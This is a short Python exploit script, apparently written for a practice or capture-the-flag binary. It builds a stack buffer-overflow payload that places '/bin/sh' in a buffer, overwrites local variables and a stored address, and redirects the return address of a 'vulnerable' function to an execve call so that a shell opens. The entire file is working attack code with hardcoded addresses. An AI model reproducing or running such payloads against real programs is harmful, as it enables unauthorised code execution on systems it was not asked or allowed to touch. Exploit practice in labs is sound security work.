#!/usr/bin/env python3

import sys
from struct import pack

bin_sh_str = b"/bin/sh\x00"

print(len(bin_sh_str))

#this will fill the buffer of size 10

sys.stdout.buffer.write(bin_sh_str)
sys.stdout.buffer.write(b"\x00\x00")
#overwrite c with 0
sys.stdout.buffer.write(b"\x00" * 8)

#overwrite b with 0
sys.stdout.buffer.write(b"\x00" * 8)

#overwrite a with the address of the start of the buffer
sys.stdout.buffer.write(0x7ffffff6d15e.to_bytes(8, 'little'))

#padding of 1
sys.stdout.buffer.write(b"\x00" * 8)

# sys.stdout.buffer.write(b"A" * ))

#overwrite the return address of vulnerable with the address of execev
sys.stdout.buffer.write(0x0000000000401e21.to_bytes(8, 'little'))
